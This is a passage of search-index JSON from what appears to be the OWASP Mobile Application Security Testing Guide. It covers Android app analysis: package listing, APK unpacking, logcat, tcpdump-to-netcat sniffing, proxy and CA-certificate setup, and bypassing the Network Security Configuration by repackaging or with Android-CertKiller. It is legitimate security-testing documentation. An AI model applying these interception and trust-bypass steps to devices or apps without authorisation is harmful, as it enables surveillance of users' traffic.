Apps","text":"<p>When targeting apps that are installed on the device, you'll first have to figure out the correct package name of the application you want to analyze. You can retrieve the installed apps either by using <code>pm</code> (Android Package Manager) or by using <code>frida-ps</code>:</p> <pre><code>$ adb shell pm list packages\npackage:sg.vantagepoint.helloworldjni\npackage:eu.chainfire.supersu\npackage:org.teamsik.apps.hackingchallenge.easy\npackage:org.teamsik.apps.hackingchallenge.hard\npackage:sg.vp.owasp_mobile.omtg_android\n</code></pre> <p>You can include flags to show only third party apps (<code>-3</code>) and the location of their APK file (<code>-f</code>), which you can use afterwards to download it via <code>adb pull</code>:</p> <pre><code>$ adb shell pm list packages -3 -f\npackage:/data/app/sg.vantagepoint.helloworldjni-1/base.apk=sg.vantagepoint.helloworldjni\npackage:/data/app/eu.chainfire.supersu-1/base.apk=eu.chainfire.supersu\npackage:/data/app/org.teamsik.apps.hackingchallenge.easy-1/base.apk=org.teamsik.apps.hackingchallenge.easy\npackage:/data/app/org.teamsik.apps.hackingchallenge.hard-1/base.apk=org.teamsik.apps.hackingchallenge.hard\npackage:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk=sg.vp.owasp_mobile.omtg_android\n</code></pre> <p>This is the same as running <code>adb shell pm path &lt;app_package_id&gt;</code> on an app package ID:</p> <pre><code>$ adb shell pm path sg.vp.owasp_mobile.omtg_android\npackage:/data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk\n</code></pre> <p>Use <code>frida-ps -Uai</code> to get all apps (<code>-a</code>) currently installed (<code>-i</code>) on the connected USB device (<code>-U</code>):</p> <pre><code>$ frida-ps -Uai\n  PID  Name                                      Identifier\n-----  ----------------------------------------  ---------------------------------------\n  766  Android System                            android\n21228  Attack me if u can                        sg.vp.owasp_mobile.omtg_android\n 4281  Termux                                    com.termux\n    -  Uncrackable1                              sg.vantagepoint.uncrackable1\n</code></pre> <p>Note that this also shows the PID of the apps that are running at the moment. Take a note of the \"Identifier\" and the PID if any as you'll need them afterwards.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/","title":"MASTG-TECH-0007: Exploring the App Package","text":"<p>Once you have collected the package name of the application you want to target, you'll want to start gathering information about it. First, retrieve the APK as explained in  Obtaining and Extracting Apps.</p> <p>APK files are actually ZIP files that can be unpacked using a standard decompression utility such as <code>unzip</code>. However, we recommend using  Apktool which additionally decodes the AndroidManifest.xml and disassembles the app binaries (classes.dex) to smali code:</p> <pre><code>$ apktool d UnCrackable-Level3.apk\n$ tree\n.\n\u251c\u2500\u2500 AndroidManifest.xml\n\u251c\u2500\u2500 apktool.yml\n\u251c\u2500\u2500 lib\n\u251c\u2500\u2500 original\n\u2502   \u251c\u2500\u2500 AndroidManifest.xml\n\u2502   \u2514\u2500\u2500 META-INF\n\u2502       \u251c\u2500\u2500 CERT.RSA\n\u2502       \u251c\u2500\u2500 CERT.SF\n\u2502       \u2514\u2500\u2500 MANIFEST.MF\n\u251c\u2500\u2500 res\n...\n\u2514\u2500\u2500 smali\n</code></pre> <p>The following files are unpacked:</p> <ul> <li>AndroidManifest.xml: contains the definition of the app's package name, target and minimum API level, app configuration, app components, permissions, etc.</li> <li>original/META-INF: contains the app's metadata<ul> <li>MANIFEST.MF: stores hashes of the app resources</li> <li>CERT.RSA: the app's certificate(s)</li> <li>CERT.SF: list of resources and the SHA-1 digest of the corresponding lines in the MANIFEST.MF file</li> </ul> </li> <li>assets: directory containing app assets (files used within the Android app, such as XML files, JavaScript files, and pictures), which the AssetManager can retrieve</li> <li>classes.dex: classes compiled in the DEX file format, that Dalvik virtual machine/Android Runtime can process. DEX is Java bytecode for the Dalvik Virtual Machine. It is optimized for small devices</li> <li>lib: directory containing third-party libraries that are part of the APK</li> <li>res: directory containing resources that haven't been compiled into resources.arsc</li> <li>resources.arsc: file containing precompiled resources, such as XML files for the layout</li> </ul> <p>As unzipping with the standard <code>unzip</code> utility leaves some files such as the <code>AndroidManifest.xml</code> unreadable, it's better to unpack the APK using  Apktool.</p> <pre><code>$ ls -alh\ntotal 32\ndrwxr-xr-x    9 sven  staff   306B Dec  5 16:29 .\ndrwxr-xr-x    5 sven  staff   170B Dec  5 16:29 ..\n-rw-r--r--    1 sven  staff    10K Dec  5 16:29 AndroidManifest.xml\n-rw-r--r--    1 sven  staff   401B Dec  5 16:29 apktool.yml\ndrwxr-xr-x    6 sven  staff   204B Dec  5 16:29 assets\ndrwxr-xr-x    3 sven  staff   102B Dec  5 16:29 lib\ndrwxr-xr-x    4 sven  staff   136B Dec  5 16:29 original\ndrwxr-xr-x  131 sven  staff   4.3K Dec  5 16:29 res\ndrwxr-xr-x    9 sven  staff   306B Dec  5 16:29 smali\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/#the-android-manifest","title":"The Android Manifest","text":"<p>The Android Manifest is the main source of information, it includes a lot of interesting information such as the package name, the permissions, app components, etc.</p> <p>Here's a non-exhaustive list of some info and the corresponding keywords that you can easily search for in the Android Manifest by just inspecting the file or by using <code>grep -i &lt;keyword&gt; AndroidManifest.xml</code>:</p> <ul> <li>App permissions: <code>permission</code> (see \"Android Platform APIs\")</li> <li>Backup allowance: <code>android:allowBackup</code> (see \"Data Storage on Android)</li> <li>App components: <code>activity</code>, <code>service</code>, <code>provider</code>, <code>receiver</code> (see \"Android Platform APIs\" and \"Data Storage on Android)</li> <li>Debuggable flag: <code>debuggable</code> (see \"Code Quality and Build Settings of Android Apps\")</li> </ul> <p>Please refer to the mentioned chapters to learn more about how to test each of these points.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/#app-binary","title":"App Binary","text":"<p>The app binary (<code>classes.dex</code>) can be found in the root directory of the app package. It is a so-called DEX (Dalvik Executable) file that contains compiled Java code. Due to its nature, after applying some conversions you'll be able to use a decompiler to produce Java code. We've also seen the folder <code>smali</code> that was obtained after we run apktool. This contains the disassembled Dalvik bytecode in an intermediate language called smali, which is a human-readable representation of the Dalvik executable.</p> <p>Refer to  Reviewing Decompiled Java Code for more information about how to reverse engineer DEX files.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/#compiled-app-binary","title":"Compiled App Binary","text":"<p>In some cases it might be useful to retrieve the compiled app binary (.odex).</p> <p>First get the path to the app's data directory:</p> <pre><code>adb shell pm path com.example.myapplication\npackage:/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/base.apk\n</code></pre> <p>Remove the <code>/base.apk</code> part, add <code>/oat/arm64/base.odex</code> and use the resulting path to pull the base.odex from the device:</p> <pre><code>adb root\nadb pull /data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/oat/arm64/base.odex\n</code></pre> <p>Note that the exact directory will be different based on your Android version. If the <code>/oat/arm64/base.odex</code> file can't be found, manually search in the directory returned by <code>pm path</code>.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/#native-libraries","title":"Native Libraries","text":"<p>You can inspect the <code>lib</code> folder in the APK:</p> <pre><code>$ ls -1 lib/armeabi/\nlibdatabase_sqlcipher.so\nlibnative.so\nlibsqlcipher_android.so\nlibstlport_shared.so\n</code></pre> <p>or from the device with objection:</p> <pre><code>...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # ls lib\nType    ...  Name\n------  ...  ------------------------\nFile    ...  libnative.so\nFile    ...  libdatabase_sqlcipher.so\nFile    ...  libstlport_shared.so\nFile    ...  libsqlcipher_android.so\n</code></pre> <p>For now this is all information you can get about the native libraries unless you start reverse engineering them, which is done using a different approach than the one used to reverse the app binary as this code cannot be decompiled but only disassembled. Refer to  Reviewing Disassembled Native Code for more information about how to reverse engineer these libraries.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0007/#other-app-resources","title":"Other App Resources","text":"<p>It is normally worth taking a look at the rest of the resources and files that you may find in the root folder of the APK as some times they contain additional goodies like key stores, encrypted databases, certificates, etc.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0008/","title":"MASTG-TECH-0008: Accessing App Data Directories","text":"<p>Once you have installed the app, there is further information to explore, where tools like objection come in handy.</p> <p>When using objection you can retrieve different kinds of information, where <code>env</code> will show you all the directory information of the app.</p> <pre><code>$ objection -g sg.vp.owasp_mobile.omtg_android explore\n\n...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # env\n\nName                    Path\n----------------------  ---------------------------------------------------------------------------\ncacheDirectory          /data/user/0/sg.vp.owasp_mobile.omtg_android/cache\ncodeCacheDirectory      /data/user/0/sg.vp.owasp_mobile.omtg_android/code_cache\nexternalCacheDirectory  /storage/emulated/0/Android/data/sg.vp.owasp_mobile.omtg_android/cache\nfilesDirectory          /data/user/0/sg.vp.owasp_mobile.omtg_android/files\nobbDir                  /storage/emulated/0/Android/obb/sg.vp.owasp_mobile.omtg_android\npackageCodePath         /data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk\n</code></pre> <p>Among this information we find:</p> <ul> <li>The internal data directory (aka. sandbox directory) which is at <code>/data/data/[package-name]</code> or <code>/data/user/0/[package-name]</code></li> <li>The external data directory at <code>/storage/emulated/0/Android/data/[package-name]</code> or <code>/sdcard/Android/data/[package-name]</code></li> <li>The path to the app package in <code>/data/app/</code></li> </ul> <p>The internal data directory is used by the app to store data created during runtime and has the following basic structure:</p> <pre><code>...g.vp.owasp_mobile.omtg_android on (google: 8.1.0)  [usb] # ls\nType       ...  Name\n---------  ...  -------------------\nDirectory  ...  cache\nDirectory  ...  code_cache\nDirectory  ...  lib\nDirectory  ...  shared_prefs\nDirectory  ...  files\nDirectory  ...  databases\n\nReadable: True  Writable: True\n</code></pre> <p>Each folder has its own purpose:</p> <ul> <li>cache: This location is used for data caching. For example, the WebView cache is found in this directory.</li> <li>code_cache: This is the location of the file system's application-specific cache directory designed for storing cached code. On devices running Android 5.0 (API level 21) or later, the system will delete any files stored in this location when the app or the entire platform is upgraded.</li> <li>lib: This folder stores native libraries written in C/C++. These libraries can have one of several file extensions, including .so and .dll (x86 support). This folder contains subdirectories for the platforms the app has native libraries for, including<ul> <li>armeabi: compiled code for all ARM-based processors</li> <li>armeabi-v7a: compiled code for all ARM-based processors, version 7 and above only</li> <li>arm64-v8a: compiled code for all 64-bit ARM-based processors, version 8 and above based only</li> <li>x86: compiled code for x86 processors only</li> <li>x86_64: compiled code for x86_64 processors only</li> <li>mips: compiled code for MIPS processors</li> </ul> </li> <li>shared_prefs: This folder contains an XML file that stores values saved via the SharedPreferences APIs.</li> <li>files: This folder stores regular files created by the app.</li> <li>databases: This folder stores SQLite database files generated by the app at runtime, e.g., user data files.</li> </ul> <p>However, the app might store more data not only inside these folders but also in the parent folder (<code>/data/data/[package-name]</code>).</p> <p>Refer to the \"Testing Data Storage\" chapter for more information and best practices on securely storing sensitive data.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0009/","title":"MASTG-TECH-0009: Monitoring System Logs","text":"<p>On Android you can easily inspect the log of system messages by using <code>Logcat</code>. There are two ways to execute Logcat:</p> <ul> <li>Logcat is part of Dalvik Debug Monitor Server (DDMS) in Android Studio. If the app is running in debug mode, the log output will be shown in the Android Monitor on the Logcat tab. You can filter the app's log output by defining patterns in Logcat.</li> </ul> <p></p> <ul> <li>You can execute Logcat with adb to store the log output permanently:</li> </ul> <pre><code>adb logcat &gt; logcat.log\n</code></pre> <p>With the following command you can specifically grep for the log output of the app in scope, just insert the package name. Of course your app needs to be running for <code>ps</code> to be able to get its PID.</p> <pre><code>adb logcat | grep \"$(adb shell ps | grep &lt;package-name&gt; | awk '{print $2}')\"\n</code></pre> <p>If you already know the app PID you may give it directly using <code>--pid</code> flag.</p> <p>You may also want to apply further filters or regular expressions (using <code>logcat</code>'s regex flags <code>-e &lt;expr&gt;, --regex=&lt;expr&gt;</code> for example) if you expect certain strings or patterns to come up in the logs.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/","title":"MASTG-TECH-0010: Basic Network Monitoring/Sniffing","text":"<p>Remotely sniffing all Android traffic in real-time is possible with  tcpdump, netcat (nc), and  Wireshark. First, make sure that you have the latest version of Android tcpdump on your phone. Here are the installation steps:</p> <pre><code>adb root\nadb remount\nadb push /wherever/you/put/tcpdump /system/xbin/tcpdump\n</code></pre> <p>If execution of <code>adb root</code> returns the error <code>adbd cannot run as root in production builds</code>, install tcpdump as follows:</p> <pre><code>adb push /wherever/you/put/tcpdump /data/local/tmp/tcpdump\nadb shell\nsu\nmount -o rw,remount /system;\ncp /data/local/tmp/tcpdump /system/xbin/\ncd /system/xbin\nchmod 755 tcpdump\n</code></pre> <p>In certain production builds, you might encounter an error <code>mount: '/system' not in /proc/mounts</code>.</p> <p>In that case, you can replace the above line <code>$ mount -o rw,remount /system;</code> with <code>$ mount -o rw,remount /</code>, as described in this Stack Overflow post.</p> <p>Remember: To use tcpdump, you need root privileges on the phone!</p> <p>Execute <code>tcpdump</code> once to see if it works. Once a few packets have come in, you can stop tcpdump by pressing CTRL+c.</p> <pre><code>$ tcpdump\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes\n04:54:06.590751 00:9e:1e:10:7f:69 (oui Unknown) &gt; Broadcast, RRCP-0x23 reply\n04:54:09.659658 00:9e:1e:10:7f:69 (oui Unknown) &gt; Broadcast, RRCP-0x23 reply\n04:54:10.579795 00:9e:1e:10:7f:69 (oui Unknown) &gt; Broadcast, RRCP-0x23 reply\n^C\n3 packets captured\n3 packets received by filter\n0 packets dropped by kernel\n</code></pre> <p>To remotely sniff the Android phone's network traffic, first execute <code>tcpdump</code> and pipe its output to <code>netcat</code> (nc):</p> <pre><code>tcpdump -i wlan0 -s0 -w - | nc -l -p 11111\n</code></pre> <p>The tcpdump command above involves</p> <ul> <li>listening on the wlan0 interface,</li> <li>defining the size (snapshot length) of the capture in bytes to get everything (-s0), and</li> <li>writing to a file (-w). Instead of a filename, we pass <code>-</code>, which will make tcpdump write to stdout.</li> </ul> <p>By using the pipe (<code>|</code>), we sent all output from tcpdump to netcat, which opens a listener on port 11111. You'll usually want to monitor the wlan0 interface. If you need another interface, list the available options with the command <code>$ ip addr</code>.</p> <p>To access port 11111, you need to forward the port to your host computer via adb.</p> <pre><code>adb forward tcp:11111 tcp:11111\n</code></pre> <p>The following command connects you to the forwarded port via netcat and piping to Wireshark.</p> <pre><code>nc localhost 11111 | wireshark -k -S -i -\n</code></pre> <p>Wireshark should start immediately (-k). It gets all data from stdin (-i -) via netcat, which is connected to the forwarded port. You should see all the phone's traffic from the wlan0 interface.</p> <p></p> <p>You can display the captured traffic in a human-readable format with Wireshark. Figure out which protocols are used and whether they are unencrypted. Capturing all traffic (TCP and UDP) is important, so you should execute all functions of the tested application and analyze it.</p> <p></p> <p>This neat little trick allows you now to identify what kind of protocols are used and to which endpoints the app is talking to. The questions is now, how can I test the endpoints if Burp is not capable of showing the traffic? There is no easy answer for this, but a few Burp plugins that can get you started.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#firebasegoogle-cloud-messaging-fcmgcm","title":"Firebase/Google Cloud Messaging (FCM/GCM)","text":"<p>Firebase Cloud Messaging (FCM), the successor to Google Cloud Messaging (GCM), is a free service offered by Google that allows you to send messages between an application server and client apps. The server and client app communicate via the FCM/GCM connection server, which handles downstream and upstream messages.</p> <p></p> <p>Downstream messages (push notifications) are sent from the application server to the client app; upstream messages are sent from the client app to the server.</p> <p>FCM is available for Android, iOS, and Chrome. FCM currently provides two connection server protocols: HTTP and XMPP. As described in the official documentation, these protocols are implemented differently. The following example demonstrates how to intercept both protocols.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#preparation-of-test-setup","title":"Preparation of Test Setup","text":"<p>You need to either configure iptables on your phone or use bettercap to be able to intercept traffic.</p> <p>FCM can use either XMPP or HTTP to communicate with the Google backend.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#http","title":"HTTP","text":"<p>FCM uses the ports 5228, 5229, and 5230 for HTTP communication. Usually, only port 5228 is used.</p> <ul> <li>Configure local port forwarding for the ports used by FCM. The following example applies to macOS:</li> </ul> <pre><code>$ echo \"\nrdr pass inet proto tcp from any to any port 5228-&gt; 127.0.0.1 port 8080\nrdr pass inet proto tcp from any to any port 5229 -&gt; 127.0.0.1 port 8080\nrdr pass inet proto tcp from any to any port 5230 -&gt; 127.0.0.1 port 8080\n\" | sudo pfctl -ef -\n</code></pre> <ul> <li>The interception proxy must listen to the port specified in the port forwarding rule above (port 8080).</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#xmpp","title":"XMPP","text":"<p>For XMPP communication, FCM uses ports 5235 (Production) and 5236 (Testing).</p> <ul> <li>Configure local port forwarding for the ports used by FCM. The following example applies to macOS:</li> </ul> <pre><code>$ echo \"\nrdr pass inet proto tcp from any to any port 5235-&gt; 127.0.0.1 port 8080\nrdr pass inet proto tcp from any to any port 5236 -&gt; 127.0.0.1 port 8080\n\" | sudo pfctl -ef -\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#intercepting-the-requests","title":"Intercepting the Requests","text":"<p>The interception proxy must listen to the port specified in the port forwarding rule above (port 8080).</p> <p>Start the app and trigger a function that uses FCM. You should see HTTP messages in your interception proxy.</p> <p></p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0010/#end-to-end-encryption-for-push-notifications","title":"End-to-End Encryption for Push Notifications","text":"<p>As an additional layer of security, push notifications can be encrypted by using Capillary. Capillary is a library to simplify the sending of end-to-end (E2E) encrypted push messages from Java-based application servers to Android clients.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/","title":"MASTG-TECH-0011: Setting Up an Interception Proxy","text":"<p>Several tools support the network analysis of applications that rely on the HTTP(S) protocol. The most important tools are the so-called interception proxies;  ZAP and  Burp Suite are the most famous. An interception proxy gives the tester a Machine-in-the-Middle (MITM) position. This position is useful for reading and/or modifying all app requests and endpoint responses, which are used for testing Authorization, Session, Management, etc.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#interception-proxy-for-a-virtual-device","title":"Interception Proxy for a Virtual Device","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#setting-up-a-web-proxy-on-an-android-virtual-device-avd","title":"Setting Up a Web Proxy on an Android Virtual Device (AVD)","text":"<p>The following procedure, which works on the Android emulator that ships with Android Studio 3.x, is for setting up an HTTP proxy on the emulator:</p> <ol> <li>Set up your proxy to listen on localhost and for example port 8080.</li> <li> <p>Configure the HTTP proxy in the emulator settings:</p> <ul> <li>Click on the three dots in the emulator menu bar</li> <li>Open the Settings Menu</li> <li>Click on the Proxy tab</li> <li>Select Manual proxy configuration</li> <li>Enter \"127.0.0.1\" in the Host Name field and your proxy port in the Port number field (e.g., \"8080\")</li> <li>Tap Apply</li> </ul> </li> </ol> <p></p> <p>HTTP and HTTPS requests should now be routed over the proxy on the host computer. If not, try toggling airplane mode off and on.</p> <p>A proxy for an AVD can also be configured on the command line by using the emulator command when starting an AVD. The following example starts the AVD Nexus_5X_API_23 and sets a proxy to 127.0.0.1 and port 8080.</p> <pre><code>emulator @Nexus_5X_API_23 -http-proxy 127.0.0.1:8080\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#installing-a-ca-certificate-on-the-virtual-device","title":"Installing a CA Certificate on the Virtual Device","text":"<p>An easy way to install a CA certificate is to push the certificate to the device and add it to the certificate store via Security Settings. For example, you can install the PortSwigger (Burp) CA certificate as follows:</p> <ol> <li>Start Burp and use a web browser on the host to navigate to burp/, then download <code>cacert.der</code> by clicking the \"CA Certificate\" button.</li> <li>Change the file extension from <code>.der</code> to <code>.cer</code>.</li> <li> <p>Push the file to the emulator:</p> <pre><code>adb push cacert.cer /sdcard/\n</code></pre> </li> <li> <p>Navigate to Settings -&gt; Security -&gt; Install from SD Card.</p> </li> <li>Scroll down and tap <code>cacert.cer</code>.</li> </ol> <p>You should then be prompted to confirm installation of the certificate (you'll also be asked to set a device PIN if you haven't already).</p> <p>This installs the certificate in the user certificate store (tested on Genymotion VM). In order to place the certificate in the root store you can perform the following steps:</p> <ol> <li>Run adb as root with <code>adb root</code> and <code>adb shell</code>.</li> <li>Locate the newly installed certificate at <code>/data/misc/user/0/cacerts-added/</code>.</li> <li>Copy the certificate to the following folder <code>/system/etc/security/cacerts/</code>.</li> <li>Reboot the Android VM.</li> </ol> <p>For Android 7.0 (API level 24) and above follow the same procedure described in the \"Bypassing the Network Security Configuration\" section.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#interception-proxy-for-a-physical-device","title":"Interception Proxy for a Physical Device","text":"<p>The available network setup options must be evaluated first. The mobile device used for testing and the host computer running the interception proxy must be connected to the same Wi-Fi network. Use either an (existing) access point or create an ad-hoc wireless network.</p> <p>Once you've configured the network and established a connection between the testing host computer and the mobile device, several steps remain.</p> <ul> <li>The proxy must be configured to point to the interception proxy.</li> <li>The interception proxy's CA certificate must be added to the trusted certificates in the Android device's certificate storage. The location of the menu used to store CA certificates may depend on the Android version and Android OEM modifications of the settings menu.</li> <li>Some application (e.g. the Chrome browser) may show <code>NET::ERR_CERT_VALIDITY_TOO_LONG</code> errors, if the leaf certificate happens to have a validity extending a certain time (39 months in case of Chrome). This happens if the default Burp CA certificate is used, since the Burp Suite issues leaf certificates with the same validity as its CA certificate. You can circumvent this by creating your own CA certificate and import it to the Burp Suite, as explained in this blog post.</li> </ul> <p>After completing these steps and starting the app, the requests should show up in the interception proxy.</p> <p>A video of setting up  ZAP with an Android device can be found on secure.force.com.</p> <p>A few other differences: from Android 8.0 (API level 26) onward, the network behavior of the app changes when HTTPS traffic is tunneled through another connection. And from Android 9 (API level 28) onward, the SSLSocket and SSLEngine will behave a little bit different in terms of error handling when something goes wrong during the handshakes.</p> <p>As mentioned before, starting with Android 7.0 (API level 24), the Android OS will no longer trust user CA certificates by default, unless specified in the application. In the following section, we explain two methods to bypass this Android security control.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#bypassing-the-network-security-configuration","title":"Bypassing the Network Security Configuration","text":"<p>In this section we will present several methods to bypass Android's Network Security Configuration.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#adding-custom-user-certificates-to-the-network-security-configuration","title":"Adding Custom User Certificates to the Network Security Configuration","text":"<p>There are different configurations available for the Network Security Configuration to add non-system Certificate Authorities via the src attribute:</p> <pre><code>&lt;certificates src=[\"system\" | \"user\" | \"raw resource\"]\n              overridePins=[\"true\" | \"false\"] /&gt;\n</code></pre> <p>Each certificate can be one of the following:</p> <ul> <li><code>\"raw resource\"</code> is an ID pointing to a file containing X.509 certificates</li> <li><code>\"system\"</code> for the pre-installed system CA certificates</li> <li><code>\"user\"</code> for user-added CA certificates</li> </ul> <p>The CA certificates trusted by the app can be a system trusted CA as well as a user CA. Usually you will have added the certificate of your interception proxy already as additional CA in Android. Therefore we will focus on the \"user\" setting, which allows you to force the Android app to trust this certificate with the following Network Security Configuration below:</p> <pre><code>&lt;network-security-config&gt;\n   &lt;base-config&gt;\n      &lt;trust-anchors&gt;\n          &lt;certificates src=\"system\" /&gt;\n          &lt;certificates src=\"user\" /&gt;\n      &lt;/trust-anchors&gt;\n   &lt;/base-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>To implement this new setting you must follow the steps below:</p> <ul> <li> <p>Decompile the app using a decompilation tool like apktool:</p> <pre><code>apktool d &lt;filename&gt;.apk\n</code></pre> </li> <li> <p>Make the application trust user certificates by creating a Network Security Configuration that includes <code>&lt;certificates src=\"user\" /&gt;</code> as explained above</p> </li> <li> <p>Go into the directory created by apktool when decompiling the app and rebuild the app using apktool. The new apk will be in the <code>dist</code> directory.</p> <pre><code>apktool b\n</code></pre> </li> <li> <p>You need to repackage the app, as explained in \" Repackaging Apps\". For more details on the repackaging process you can also consult the Android developer documentation, that explains the process as a whole.</p> </li> </ul> <p>Note that even if this method is quite simple its major drawback is that you have to apply this operation for each application you want to evaluate which is additional overhead for testing.</p> <p>Bear in mind that if the app you are testing has additional hardening measures, like verification of the app signature you might not be able to start the app anymore. As part of the repackaging you will sign the app with your own key and therefore the signature changes will result in triggering such checks that might lead to immediate termination of the app. You would need to identify and disable such checks either by patching them during repackaging of the app or dynamic instrumentation through Frida.</p> <p>There is a python script available that automates the steps described above called Android-CertKiller. This Python script can extract the APK from an installed Android app, decompile it, make it debuggable, add a new Network Security Configuration that allows user certificates, builds and signs the new APK and installs the new APK with the SSL Bypass.</p> <pre><code>python main.py -w\n\n***************************************\nAndroid CertKiller (v0.1)\n***************************************\n\nCertKiller Wizard Mode\n---------------------------------\nList of devices attached\n4200dc72f27bc44d    device\n\n---------------------------------\n\nEnter Application Package Name: nsc.android.mstg.owasp.org.android_nsc\n\nPackage: /data/app/nsc.android.mstg.owasp.org.android_nsc-1/base.apk\n\nI. Initiating APK extraction from device\n   complete\n------------------------------\nI. Decompiling\n   complete\n------------------------------\nI. Applying SSL bypass\n   complete\n------------------------------\nI. Building New APK\n   complete\n------------------------------\nI. Signing APK\n   complete\n------------------------------\n\nWould you like to install the APK on your device(y/N): y\n------------------------------------\n Installing Unpinned APK\n------------------------------\nFinished\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#adding-the-proxys-certificate-among-system-trusted-cas-using-magisk","title":"Adding the Proxy's certificate among system trusted CAs using Magisk","text":"<p>In order to avoid the obligation of configuring the Network Security Configuration for each application, we must force the device to accept the proxy's certificate as one of the systems trusted certificates.</p> <p>There is a Magisk module that will automatically add all user-installed CA certificates to the list of system trusted CAs.</p> <p>Download the latest version of the module at the Github Release page, push the downloaded file over to the device and import it in the Magisk Manager's \"Module\" view by clicking on the <code>+</code> button. Finally, a restart is required by Magisk Manager to let changes take effect.</p> <p>From now on, any CA certificate that is installed by the user via \"Settings\", \"Security &amp; location\", \"Encryption &amp; credentials\", \"Install from storage\" (location may differ) is automatically pushed into the system's trust store by this Magisk module. Reboot and verify that the CA certificate is listed in \"Settings\", \"Security &amp; location\", \"Encryption &amp; credentials\", \"Trusted credentials\" (location may differ).</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#manually-adding-the-proxys-certificate-among-system-trusted-cas","title":"Manually adding the Proxy's certificate among system trusted CAs","text":"<p>Alternatively, you can follow the following steps manually in order to achieve the same result:</p> <ul> <li>Make the /system partition writable, which is only possible on a rooted device. Run the 'mount' command to make sure the /system is writable: <code>mount -o rw,remount /system</code>. If this command fails, try running the following command <code>mount -o rw,remount -t ext4 /system</code></li> <li> <p>Prepare the proxy's CA certificates to match system certificates format. Export the proxy's certificates in <code>der</code> format (this is the default format in Burp Suite) then run the following commands:</p> <pre><code>$ openssl x509 -inform DER -in cacert.der -out cacert.pem\n$ openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1\nmv cacert.pem &lt;hash&gt;.0\n</code></pre> </li> <li> <p>Finally, copy the <code>&lt;hash&gt;.0</code> file into the directory /system/etc/security/cacerts and then run the following command:</p> <pre><code>chmod 644 &lt;hash&gt;.0\n</code></pre> </li> </ul> <p>By following the steps described above you allow any application to trust the proxy's certificate, which allows you to intercept its traffic, unless of course the application uses SSL pinning.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#potential-obstacles","title":"Potential Obstacles","text":"<p>Applications often implement security controls that make it more difficult to perform a security review of the application, such as root detection and certificate pinning. Ideally, you would acquire both a version of the application that has these controls enabled, and one where the controls are disabled. This allows you to analyze the proper implementation of the controls, after which you can continue with the less-secure version for further tests.</p> <p>Of course, this is not always possible, and you may need to perform a black-box assessment on an application where all security controls are enabled. The section below shows you how you can circumvent certificate pinning for different applications.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#client-isolation-in-wireless-networks","title":"Client Isolation in Wireless Networks","text":"<p>Once you have setup an interception proxy and have a MITM position you might still not be able to see anything. This might be due to restrictions in the app (see next section) but can also be due to so called client isolation in the Wi-Fi that you are connected to.</p> <p>Wireless Client Isolation is a security feature that prevents wireless clients from communicating with one another. This feature is useful for guest and BYOD SSIDs adding a level of security to limit attacks and threats between devices connected to the wireless networks.</p> <p>What to do if the Wi-Fi we need for testing has client isolation?</p> <p>You can configure the proxy on your Android device to point to 127.0.0.1:8080, connect your phone via USB to your host computer and use adb to make a reverse port forwarding:</p> <pre><code>adb reverse tcp:8080 tcp:8080\n</code></pre> <p>Once you have done this all proxy traffic on your Android phone will be going to port 8080 on 127.0.0.1 and it will be redirected via adb to 127.0.0.1:8080 on your host computer and you will see now the traffic in your Burp. With this trick you are able to test and intercept traffic also in Wi-Fis that have client isolation.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0011/#non-proxy-aware-apps","title":"Non-Proxy Aware Apps","text":"<p>Once you have setup an interception proxy and have a MITM position you might still not be able to see anything. This is mainly due to the following reasons:</p> <ul> <li>The app is using a framework like Xamarin that simply is not using the proxy settings of the Android OS or</li> <li>The app you are testing is verifying if a proxy is set and is not allowing now any communication.</li> </ul> <p>In both scenarios you would need additional steps 